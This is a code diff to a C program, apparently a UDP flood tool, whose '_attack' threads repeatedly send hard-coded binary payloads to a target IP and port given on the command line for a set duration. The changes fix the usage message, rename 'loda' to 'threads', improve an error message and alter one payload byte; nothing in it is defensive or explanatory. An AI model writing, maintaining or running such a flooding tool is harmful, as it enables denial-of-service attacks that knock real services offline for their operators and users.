@@ -6,8 +6,8 @@
 #include <pthread.h>
 #include <time.h>
 
-void _usage() {
-    printf("Usage: %s ip port time loda\n", argv[0]);
+void _usage(char **_argv) {
+    printf("Usage: %s ip port time threads\n", _argv[0]);
     exit(1);
 }
 
@@ -49,7 +49,7 @@ void *_attack(void *_arg) {
         "\x35\x30\x37\x33\x39\x32\x39\x33\x36\x35\x00\x00\x00\x00\x0a\x31",
         "\x32\x37\x2e\x30\x2e\x30\x2e\x32\x00\x00\x00\x00\x00\x69\xbc\x53",
         "\x98\x00\x00\x00\x21\x37\x61\x35\x64\x39\x63\x33\x39\x38\x64\x33",
-        "\x36\x65\x31\x39\x35\x39\x37\x39\x39\x30\x34\x30\x30\x36\x34\x66",
+        "\x36\x65\x31\x39\x35\x39\x37\x79\x39\x30\x34\x30\x30\x36\x34\x66",
         "\x32\x62\x62\x34\x39\x00",
         "\x28\x28\x70\x00\x2a\x08\x01\x10\x01\x18\xd3\xe8\xf8\xf2\xa1\xe9",
         "\xa7\xd7\xfd\x01\x20\xcb\x2e\x2a\x11\x31\x38\x35\x35\x38\x34\x32",
@@ -110,7 +110,7 @@ void *_attack(void *_arg) {
     };
 
     if ((_sock = socket(2, 2, 0)) < 0) {
-        perror("failed");
+        perror("Socket failed");
         pthread_exit(NULL);
     }
 
@@ -132,7 +132,7 @@ void *_attack(void *_arg) {
 }
 
 int main(int argc, char **argv) {
-    if (argc != 5) _usage();
+    if (argc != 5) _usage(argv);
 
     char *_ip = argv[1];
     int _port = atoi(argv[2]);
@@ -142,7 +142,7 @@ int main(int argc, char **argv) {
     pthread_t *_tids = malloc(_threads * 8);
     struct _td _data = {_ip, _port, _time};
 
-    printf("Started %s:%d %ds %d loda\n", _ip, _port, _time, _threads);
+    printf("Started %s:%d %ds %d threads\n", _ip, _port, _time, _threads);
 
     for (int i = 0; i < _threads; i++) {
         pthread_create(&_tids[i], NULL, _attack, &_data);
